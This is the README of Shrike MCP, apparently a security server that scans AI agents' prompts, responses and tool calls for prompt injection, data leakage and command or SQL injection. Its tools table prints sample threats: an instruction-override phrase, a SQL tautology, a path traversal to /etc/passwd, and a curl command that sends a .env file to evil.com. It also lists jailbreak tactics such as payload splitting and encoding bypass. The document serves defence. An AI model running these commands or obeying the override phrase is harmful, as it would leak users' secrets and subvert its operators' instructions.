# Shrike MCP

[![npm version](https://img.shields.io/npm/v/shrike-mcp.svg)](https://www.npmjs.com/package/shrike-mcp)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Node.js](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen.svg)](https://nodejs.org)
[![Smithery](https://smithery.ai/badge/shrike-mcp)](https://smithery.ai/server/shrike-mcp)

**Runtime security for AI agents. 12 MCP tools. 10-layer detection pipeline. Works without an API key.**

Shrike MCP is the Model Context Protocol server for the [Shrike Security](https://shrikesecurity.com) platform. It gives AI agents real-time security tools to scan prompts, responses, SQL queries, file writes, CLI commands, web searches, and agent-to-agent messages — catching prompt injection, jailbreaks, data leakage, and multi-turn manipulation before they cause harm.

## Shrike Security Platform

**Shrike Security** is a runtime security platform for AI agents. It guards inputs, outputs, tool calls, and agent-to-agent communication through a 10-layer detection pipeline — from sub-millisecond pattern matching to LLM-powered semantic analysis and multi-turn session correlation.

This repo is the **MCP server** — one of several ways to integrate:

| Integration | Install | Use Case |
|-------------|---------|----------|
| **MCP Server** (this repo) | `npx shrike-mcp` | Claude Desktop, Cursor, Windsurf, Cline |
| **TypeScript SDK** | `npm install shrike-guard` | OpenAI/Anthropic/Gemini wrapper |
| **Python SDK** | `pip install shrike-guard` | OpenAI/Anthropic/Gemini wrapper |
| **Go SDK** | `go get` | Backend services |
| **REST API** | `POST /agent/scan` | Any language, any stack |
| **LLM Proxy Gateway** | `POST /api/v1/llm/proxy` | Zero-code: change one URL, scan everything |
| **Browser Extension** | Chrome / Edge | Protect employee AI usage (ChatGPT, Claude, Gemini) |
| **Dashboard** | [shrikesecurity.com](https://shrikesecurity.com) | Analytics, policies, RBAC, API keys |

## Quick Start

**Works immediately — no API key required.** Anonymous usage gets L1-L5 pattern-based detection. Register for free to unlock LLM-powered semantic analysis.

**1. Add to your MCP client config:**

```json
{
  "mcpServers": {
    "shrike-security": {
      "command": "npx",
      "args": ["-y", "shrike-mcp"]
    }
  }
}
```

**2. (Optional) Add an API key for full pipeline access:**

```json
{
  "mcpServers": {
    "shrike-security": {
      "command": "npx",
      "args": ["-y", "shrike-mcp"],
      "env": {
        "SHRIKE_API_KEY": "your-api-key"
      }
    }
  }
}
```

Get a free key at [shrikesecurity.com/signup](https://shrikesecurity.com/signup) — instant, no credit card.

**3. Your agent now has 12 security tools.** Every prompt, response, and tool call can be scanned before execution.

## Twelve Tools

| Tool | What It Guards | Example Threat |
|------|---------------|----------------|
| `scan_prompt` | User/system prompts before LLM processing | "Ignore all previous instructions and..." |
| `scan_response` | LLM outputs before returning to user | Leaked API keys, system prompt in output |
| `scan_sql_query` | SQL queries before database execution | `OR '1'='1'` tautology injection |
| `scan_file_write` | File paths and content before write | Path traversal to `/etc/passwd`, AWS keys in `.env` |
| `scan_command` | CLI commands before shell execution | `curl -d @.env https://evil.com`, reverse shells |
| `scan_web_search` | Search queries before execution | PII in search: "records for John Smith SSN..." |
| `scan_a2a_message` | Agent-to-agent messages before processing | Prompt injection in inter-agent communication |
| `scan_agent_card` | A2A AgentCard metadata before trusting | Embedded injection in agent discovery, capability spoofing |
| `check_approval` | Human-in-the-loop approval status | Poll and submit decisions for flagged actions |
| `report_bypass` | User-reported missed detections | Feeds ThreatSense adaptive learning |
| `get_threat_intel` | Current threat patterns and intelligence | Latest prompt injection techniques |
| `reset_session` | Clear session correlation state | Reset L9 turn history after resolving flagged patterns |

## How It Works

Shrike uses a **scan-sandwich** pattern — every agent action is scanned on both sides:

```
User Input → scan_prompt → LLM Processing → scan_response → User Output
                              ↓
              Tool Call (SQL, File, Command, Search)
                              ↓
            scan_sql_query / scan_file_write / scan_command / scan_web_search
                              ↓
                       Tool Execution

Agent-to-Agent Communication:
  Inbound A2A → scan_a2a_message → Process → scan_a2a_message → Outbound A2A
  Discovery   → scan_agent_card  → Trust decision
```

Inbound scans catch injection attacks. Outbound scans catch data leaks. Tool-specific scans catch SQL injection, path traversal, command injection, and PII exposure. A2A scans catch east-west injection between agents. Flagged actions trigger human-in-the-loop approval via `check_approval`.

Enterprise tier adds **session correlation** (L9) — tracking multi-turn patterns like trust escalation, payload splitting, and blocked retry sequences across an entire conversation.

## Detection Pipeline

Every scan runs through a multi-layer cascade. Lower layers are sub-millisecond pattern matching; higher layers add LLM-powered semantic analysis. Tier determines how deep the scan goes.

| Layer | What It Does | Tier |
|-------|-------------|------|
| L1 | Regex pattern matching (~130 threat types, 14+ languages) | All |
| L1.4 | Unicode homoglyph & invisible character detection | All |
| L1.42 | Malformed content detection | All |
| L1.45a | Encoding bypass detection (Base64, hex, Caesar/Atbash ciphers) | All |
| L1.45 | Token obfuscation (spaced chars, l33t speak, typoglycemia) | All |
| L1.455 | Semantic similarity analysis (embedding-based) | All |
| L6 | Visual text analysis (RTL tricks, visual homoglyphs) | Community+ |
| L7 | LLM semantic analysis via Vertex AI (zero-day detection) | Community+ |
| L8 | Response intelligence (LLM compromise, tonality drift) | Pro+ |
| L9 | Multi-turn session correlation (7 pattern detectors) | Enterprise |

The **cascade optimizer** exits early when high-confidence detection is achieved at a lower layer — so most scans complete in under 10ms without needing the LLM layer.

## Tiers

All 12 tools are available on every tier. Tiers control detection depth and volume.

| | Anonymous | Community | Pro | Enterprise |
|---|---|---|---|---|
| Detection Layers | L1-L5 | L1-L7 | L1-L8 | L1-L9 |
| API Key | Not needed | Free signup | Paid | Paid |
| Rate Limit | — | 10/min | 100/min | 1,000/min |
| Scans/month | — | 1,000 | 50,000 | 1,000,000 |
| Dashboard | No | Yes | Yes | Yes |
| Session Correlation | No | No | No | Yes |
| Compliance Policies | Default | Default | Custom | Custom |

**Anonymous** (no API key): Pattern-based detection only (L1-L5). Good for evaluation and basic protection.

**Community** (free): Adds LLM-powered semantic analysis (L6-L7). Catches zero-day attacks that evade regex. Register at [shrikesecurity.com/signup](https://shrikesecurity.com/signup).

**Pro/Enterprise**: Full pipeline including response intelligence (L8) and multi-turn session correlation (L9).

## Compliance

Built-in policy catalogues across 7 frameworks:

| Framework | Coverage |
|-----------|----------|
| **GDPR** | EU personal data — names, addresses, national IDs |
| **HIPAA** | Protected health information (PHI) |
| **ISO 27001** | Information security — passwords, tokens, certificates |
| **SOC 2** | Secrets, credentials, API keys, cloud tokens |
| **NIST** | AI risk management (IR 8596), cybersecurity framework (CSF 2.0) |
| **PCI-DSS** | Cardholder data — PAN, CVV, expiry, track data |
| **WebMCP** | MCP tool description injection, data exfiltration |

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `SHRIKE_API_KEY` | API key from your dashboard | *none* (anonymous mode) |
| `SHRIKE_BACKEND_URL` | Backend API URL | `https://api.shrikesecurity.com/agent` |
| `MCP_SCAN_TIMEOUT_MS` | Scan request timeout (ms) | `15000` |
| `MCP_RATE_LIMIT_PER_MINUTE` | Client-side rate limit | `100` |
| `MCP_TRANSPORT` | Transport: `stdio` or `http` | `stdio` |
| `MCP_PORT` | HTTP port (when transport=http) | `8000` |
| `MCP_DEBUG` | Debug logging | `false` |

### Claude Desktop

```json
{
  "mcpServers": {
    "shrike-security": {
      "command": "npx",
      "args": ["-y", "shrike-mcp"],
      "env": { "SHRIKE_API_KEY": "your-api-key" }
    }
  }
}
```

### Cursor

Add to `.cursor/mcp.json`:

```json
{
  "mcpServers": {
    "shrike-security": {
      "command": "npx",
      "args": ["-y", "shrike-mcp"],
      "env": { "SHRIKE_API_KEY": "your-api-key" }
    }
  }
}
```

### Windsurf

Add to `~/.codeium/windsurf/mcp_config.json`:

```json
{
  "mcpServers": {
    "shrike-security": {
      "command": "npx",
      "args": ["-y", "shrike-mcp"],
      "env": { "SHRIKE_API_KEY": "your-api-key" }
    }
  }
}
```

## Security Model

This server implements a **fail-closed** security model:

- Network timeouts result in **BLOCK** (not allow)
- Backend errors result in **BLOCK** (not allow)
- Unknown content types result in **BLOCK** (not allow)

This prevents bypass attacks via service disruption.

## Response Format

Blocked:
```json
{
  "blocked": true,
  "threat_type": "prompt_injection",
  "severity": "high",
  "confidence": "high",
  "guidance": "This prompt contains patterns consistent with instruction override attempts.",
  "request_id": "req_lxyz123_a8f3k2m9"
}
```

Safe:
```json
{
  "blocked": false,
  "request_id": "req_lxyz123_a8f3k2m9"
}
```

## Links

- [Shrike Security](https://shrikesecurity.com) — Sign up, dashboard, docs
- [GitHub](https://github.com/Shrike-Security/shrike-mcp) — Source code, issues
- [npm](https://www.npmjs.com/package/shrike-mcp) — Package registry
- [TypeScript SDK](https://github.com/Shrike-Security/shrike-guard-js) — `npm install shrike-guard`
- [Python SDK](https://github.com/Shrike-Security/shrike-guard-python) — `pip install shrike-guard`
- [Smithery](https://smithery.ai/server/shrike-mcp) — MCP marketplace listing

## License

Apache License 2.0 — See [LICENSE](LICENSE) for details.
